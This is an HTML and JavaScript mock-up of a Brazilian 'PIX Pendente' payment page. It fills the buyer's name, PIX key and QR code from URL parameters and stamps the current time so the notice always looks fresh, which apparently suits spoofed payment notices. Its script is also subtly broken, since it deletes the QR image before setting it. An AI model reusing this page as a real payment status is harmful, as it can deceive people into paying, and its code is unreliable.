<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Pendente</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #eaeaea;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 277px;
            height: 700px;
            padding: 0;
            background-color: #fff;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }

        .header {
            background-image: url('header.png');
            background-size: cover;
            background-repeat: no-repeat;
            color: white;
            padding: 60px;
        }

        .value-date-container {
            background-color: #fff;
            border-radius: 8px;
            padding: 10px;
            margin: -30px 20px 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }

        .value-date {
            text-align: left;
            position: relative;
            padding: 0 5px;
            z-index: 1;
        }

        .value-date label {
            font-size: 16px;
            color: #666;
            font-weight: bold;
        }

        .value-date p {
            font-size: 16px;
            color: #1178d3;
            font-weight: 800;
            margin: 2px 0px 0px 0px;
        }

        .status-alert {
            background-color: #f7f7f7;
            color: #333;
            text-align: left;
            padding: 15px;
            margin: 0 20px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .status-alert img {
            height: 45px;
            margin-right: 19px;
        }

        .status-text {
            color: #ff635f;
            font-size: 18px;
        }

        .status-text strong {
            font-weight: bold;
            color: #d9534f;
            margin-bottom: 5px;
        }

        .receiver-info {
            padding: 20px;
            background-color: #f7f7f7;
            border-radius: 4px;
            margin: 15px 20px 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .receiver-info h2 {
            font-size: 16px;
            color: #333;
            margin-bottom: 10px;
            font-weight: bold;
        }

        .receiver-info label {
            font-size: 16px;
            color: #666;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        .receiver-info p {
            font-size: 18px;
            color: #333;
            margin: 5px 0px 10px 0px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"></div>
        <div class="value-date-container">
            <div class="value-date">
                <label>Valor</label>
                <p>R$ 49,90</p>
            </div>
            <div class="value-date" style="text-align: center;">
                <label>Data</label>
                <p style="margin: 1px 0 px -4px 0px;"><span style="font-size: 16px;">18/10/2024</span><br><span style="font-size: 16px;">19:32:49</span></p>
            </div>
        </div>
        <div class="status-alert">
            <img src="erro.png" alt="Erro">
            <div class="status-text">
                <strong style="font-size: 16px; color: red;">PIX Pendente!</strong><br>
                Aguardando Pagamento...
            </div>
        </div>
        <div class="receiver-info">
            <h2>Dados do Comprador:</h2>
            <label>Nome</label>
            <p id="nome"></p>
            <label>Chave PIX</label>
            <p id="pix">
                <span onclick="navigator.clipboard.writeText(document.getElementById('pix').textContent); alert('PIX COPIA E COLA COPIADO!');" style="cursor: pointer;">Copiar Chave PIX</span>
                <br>
                <img id="qrcode" src="" alt="QR Code">
            </p>
        </div>
    </div>
    <script>
        // Função para obter os parâmetros da URL
        function getQueryParams() {
            var params = {};
            var parser = document.createElement('a');
            parser.href = window.location.href;
            var query = parser.search.substring(1);
            var vars = query.split('&');
            for (var i = 0; i < vars.length; i++) {
                var pair = vars[i].split('=');
                params[pair[0]] = decodeURIComponent(pair[1]);
            }
            return params;
        }

        // Função para atualizar a data e a hora
        function updateDateTime() {
            var now = new Date();
            var options = {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false,
                timeZone: 'America/Sao_Paulo'
            };
            var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', '');
            var [date, time] = dateTimeString.split(' ');
            document.querySelector('.value-date span:first-child').textContent = date.trim();
            document.querySelector('.value-date span:last-child').textContent = time;
        }

        // Configura os parâmetros da URL nos campos
        window.onload = function () {
            var queryParams = getQueryParams();
            if (queryParams.nome) {
                document.getElementById('nome').textContent = queryParams.nome;
            }
            if (queryParams.pix) {
                document.getElementById('pix').textContent = queryParams.pix;
                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
            }
            if (queryParams.qrcode) {
                document.getElementById('qrcode').src = queryParams.qrcode;
            }
            updateDateTime();
        };
    </script>
</body>
</html>
